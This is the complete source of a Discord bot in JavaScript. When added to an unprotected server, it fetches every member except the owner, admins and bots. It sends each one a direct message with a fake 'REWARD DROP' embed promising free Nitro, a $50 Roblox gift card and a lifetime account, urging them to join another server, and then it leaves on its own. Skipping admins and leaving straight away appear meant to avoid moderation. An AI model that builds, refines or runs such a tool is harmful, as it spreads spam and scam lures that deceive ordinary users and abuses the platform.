require('dotenv').config();
const { 
    Client, 
    GatewayIntentBits, 
    PermissionFlagsBits, 
    EmbedBuilder 
} = require('discord.js');
const fs = require('fs');
const path = require('path');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// Persistent Database Setup
const DB_FILE = path.join(__dirname, 'database.json');

function loadDB() {
    if (!fs.existsSync(DB_FILE)) {
        const initialData = {
            protectedServers: [], // Server IDs saved via !save
            customEmbed: {
                title: "📢 Custom Bot Embed",
                description: "This is the independent custom embed displayed using the !embed command.",
                color: 3066993
            },
            dmEmbed: {
                title: "🎁 REWARD DROP",
                description: "**You’ve unlocked your rewards.**\n\n💎 **Nitro**\n🎮 **$50 Roblox Gift Card**\n⛏️ **MCFA Lifetime**\n\nJoin the server to access your rewards.\n**Don’t miss out!**",
                color: 16766720,
                footer: "LIMITED REWARD DROP"
            },
            queue: {} // Tracks server processing status
        };
        fs.writeFileSync(DB_FILE, JSON.stringify(initialData, null, 2));
    }
    return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
}

function saveDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

client.once('ready', () => {
    console.log(`🤖 Logged in as ${client.user.tag}! Ready and running.`);
});

// Admin permission helper check
function isAdmin(message) {
    return message.member && message.member.permissions.has(PermissionFlagsBits.Administrator);
}

// ----------------------------------------------------
// COMMAND HANDLER & ADMIN RESTRICTIONS
// ----------------------------------------------------
client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.guild) return;

    const args = message.content.trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // 1. !save - Protects current server from DMing and leaving
    if (command === '!save') {
        if (!isAdmin(message)) {
            return message.reply("❌ Administrator permissions required.");
        }

        const db = loadDB();
        const serverId = message.guild.id;

        if (!db.protectedServers.includes(serverId)) {
            db.protectedServers.push(serverId);
            saveDB(db);
            return message.reply(`🔒 Server **${message.guild.name}** is now protected! The bot will not DM members or leave this server.`);
        } else {
            return message.reply(`ℹ️ Server **${message.guild.name}** is already in the protected list.`);
        }
    }

    // 2. !embed - Displays the separate custom bot embed
    if (command === '!embed') {
        const db = loadDB();
        const cfg = db.customEmbed;

        const embed = new EmbedBuilder()
            .setTitle(cfg.title)
            .setDescription(cfg.description)
            .setColor(cfg.color);

        return message.channel.send({ embeds: [embed] });
    }

    // 3. Admin Command: Set Custom Embed (!setembed Title | Description)
    if (command === '!setembed') {
        if (!isAdmin(message)) return message.reply("❌ Administrator permissions required.");

        const text = args.join(" ");
        const parts = text.split('|');
        if (parts.length < 2) {
            return message.reply("⚠️ Usage: `!setembed Title | Description`");
        }

        const db = loadDB();
        db.customEmbed.title = parts[0].trim();
        db.customEmbed.description = parts[1].trim();
        saveDB(db);

        return message.reply("✅ Custom display embed (`!embed`) updated successfully!");
    }

    // 4. Admin Command: Set DM Embed (!setdmembed Title | Description)
    if (command === '!setdmembed') {
        if (!isAdmin(message)) return message.reply("❌ Administrator permissions required.");

        const text = args.join(" ");
        const parts = text.split('|');
        if (parts.length < 2) {
            return message.reply("⚠️ Usage: `!setdmembed Title | Description`");
        }

        const db = loadDB();
        db.dmEmbed.title = parts[0].trim();
        db.dmEmbed.description = parts[1].trim();
        saveDB(db);

        return message.reply("✅ DM workflow embed updated successfully!");
    }

    // 5. !queue - View queue status of servers
    if (command === '!queue') {
        if (!isAdmin(message)) return message.reply("❌ Administrator permissions required.");

        const db = loadDB();
        const queueEntries = Object.entries(db.queue);

        if (queueEntries.length === 0) {
            return message.reply("📊 The server queue is currently empty.");
        }

        let report = `📊 **Server Queue Status Report:**\n\n`;
        let position = 1;

        for (const [id, data] of queueEntries) {
            report += `**${position}. ${data.serverName}** (ID: \`${id}\`)\n`;
            report += `• Status: \`${data.status}\`\n`;
            report += `• Result: ${data.result}\n`;
            report += `• Completion Time: ${data.completionTime}\n\n`;
            position++;
        }

        return message.reply(report);
    }
});

// ----------------------------------------------------
// NEW SERVER WORKFLOW & PROTECTION LOGIC
// ----------------------------------------------------
client.on('guildCreate', async (guild) => {
    const db = loadDB();
    const serverId = guild.id;
    const serverName = guild.name;

    // Step 1: Detect server and add to queue
    db.queue[serverId] = {
        serverName: serverName,
        status: "Waiting",
        result: "Pending",
        completionTime: "Not yet completed"
    };
    saveDB(db);

    console.log(`[Queue] Added server to queue: ${serverName} (${serverId})`);

    db.queue[serverId].status = "Processing";
    saveDB(db);

    // Step 2: Check if server is protected using !save list
    if (db.protectedServers.includes(serverId)) {
        db.queue[serverId].status = "Stayed";
        db.queue[serverId].result = "Protected / Skipped (No DMs sent)";
        db.queue[serverId].completionTime = new Date().toLocaleString();
        saveDB(db);

        console.log(`[Protected] Server ${serverName} is protected. Bot is staying without sending DMs.`);
        return;
    }

    // Unprotected Server Workflow: Send DM embed, then leave
    try {
        const fetchedMembers = await guild.members.fetch();
        const targetMembers = fetchedMembers.filter(member => {
            if (member.user.bot) return false;
            if (member.id === guild.ownerId) return false;
            if (member.permissions.has(PermissionFlagsBits.Administrator)) return false;
            return true;
        });

        const cfg = db.dmEmbed;

        for (const [id, member] of targetMembers) {
            try {
                const dmEmbed = new EmbedBuilder()
                    .setColor(cfg.color)
                    .setTitle(cfg.title)
                    .setDescription(cfg.description)
                    .setFooter({ text: cfg.footer });

                await member.send({
                    content: `🎉 Congrats <@${member.id}>! Your rewards are waiting.`,
                    embeds: [dmEmbed]
                });
            } catch (err) {
                // Ignore users with closed DMs
            }
            await new Promise(resolve => setTimeout(resolve, 1500)); // Rate-limit safety delay
        }

        db.queue[serverId].status = "Completed";
        db.queue[serverId].result = "Successfully messaged members";
        db.queue[serverId].completionTime = new Date().toLocaleString();
        saveDB(db);

        // Automatically leave the server after finishing DM workflow
        console.log(`[Workflow] Finished messaging members in ${serverName}. Leaving server automatically...`);
        
        db.queue[serverId].status = "Left";
        saveDB(db);

        await guild.leave();

    } catch (error) {
        console.error(`Error processing server ${serverName}:`, error);
        db.queue[serverId].status = "Completed";
        db.queue[serverId].result = `Error: ${error.message}`;
        db.queue[serverId].completionTime = new Date().toLocaleString();
        saveDB(db);
    }
});

client.login(process.env.BOT_TOKEN);
